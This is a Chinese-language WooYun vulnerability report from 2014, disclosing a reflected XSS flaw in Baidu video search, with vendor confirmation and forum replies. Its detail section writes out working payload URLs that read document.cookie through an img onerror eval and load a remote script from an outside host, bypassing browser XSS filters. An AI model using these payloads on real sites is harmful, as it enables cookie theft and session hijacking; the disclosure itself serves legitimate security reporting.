{"id": 2683, "wybug_id": "wooyun-2014-064352", "wybug_title": "百度搜索反射型跨站第一弹（无视浏览器xss filter）", "wybug_corp": "百度", "wybug_author": "vanilla", "wybug_date": "2014-06-10 16:39", "wybug_open_date": "2014-07-25 16:40", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-25：\t细节向公众公开  简要描述： 无聊的时候去研究了下百度搜索，我也不太相信百度搜索还有xss,不过它确实有 详细说明：  存在问题的界面是百度视频搜索部分会出现如下界面\nhttp://v.baidu.com/v?word=xxx&ct=301989888&rn=20&pn=0&db=0&s=0&fbl=800\n\n\n当我选择筛选长30分钟以上，链接会变成\nhttp://v.baidu.com/v?word=xxx&ct=301989888&rn=20&pn=0&db=0&s=0&fbl=800#pn=0&old=&ty=0&nf=0&cl=0&du=1&pd=0&sc=0&order=0\n测试发现对于#后面的值，并没有进行有效的过滤但是此处同一个&里面不能出现两个=因此我们可以构造跨站代码：\nhttp://v.baidu.com/v?word=xxx&ct=301989888&rn=20&pn=0&db=0&s=0&fbl=800#pn=0&old=&ty=0&nf=0&cl=0&du=0&pd=0&sc=3&order=0&from=selectsite\"><img/&/src=& onerror=eval('if(window.x!\\x3d1){alert(document.cookie);window.x\\x3d1}')//>\n\n\n\n\n由于跨站代码是在#后面的，所以不会被浏览器xss filter 拦截   漏洞证明：  弹个框框\nhttp://v.baidu.com/v?word=xxx&ct=301989888&rn=20&pn=0&db=0&s=0&fbl=800#pn=0&old=&ty=0&nf=0&cl=0&du=0&pd=0&sc=3&order=0&from=selectsite\"><img/&/src=& onerror=eval('if(window.x!\\x3d1){alert(document.cookie);window.x\\x3d1}')//>\n加载js:\nhttp://v.baidu.com/v?word=xxxx&ct=301989888&rn=20&pn=0&db=0&s=0&fbl=800#pn=0&old=&ty=0&nf=0&cl=0&du=0&pd=0&sc=3&order=0&from=selectsite\"><img/&/src=& onerror=eval(\"if(window.x!\\x3d1){with(document)body.appendChild(createElement('script')).src\\x3d'//xxxx.xxxx.com/test/alert.js';window.x\\x3d1}\")//>\n\n\n   修复方案：  过滤#后面的内容   版权声明：转载请注明来源 vanilla@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-06-10 17:36 厂商回复： 感谢对BAIDU安全的支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-10 16:42 |    \t\t苏泽 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:19        | 大习科。)\t\t \n  前排卖瓜子，香烟，爆米花。    \n     2014-06-10 16:44 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  主站？是新版导致的么。    \n     2014-06-10 16:47 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @疯狗 = =惊现新郎官!!!!    \n     2014-06-10 16:53 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  @疯狗 = =惊现新郎官!!!!    \n     2014-06-10 16:53 |    \t\tCookies \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:14        | 一入乌云深似海，从此马甲是路人。)\t\t \n  @苏泽 卖爆米花的，有没有@苏泽的菊花    \n     2014-06-10 16:57 |    \t\tterrying \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:15        | 雅蠛蝶)\t\t \n  前排广告位出租    \n     2014-06-10 17:11 |    \t\tvanilla \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | xss,javascript,代码审计)\t\t \n  @疯狗 先恭喜狗哥，视频搜索，我标题党了吗    \n     2014-06-10 17:21 |    \t\t无名 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:9        | 我是一只小菜鸟呀，伊雅伊尔哟。)\t\t \n  你在乌云这么屌，你家人知道么？    \n     2014-06-10 17:35 |    \t\t百度(乌云厂商)\t\t \n  感谢对baidu安全的支持    \n     2014-06-11 17:05 |    \t\tvanilla \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | xss,javascript,代码审计)\t\t \n  @百度 @疯狗 漏洞确实存在，但是影响不大？http://www.wooyun.org/bugs/wooyun-2010-064505/trace/9280e041c691baff137ef7c39e54cdc7，登陆界面    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}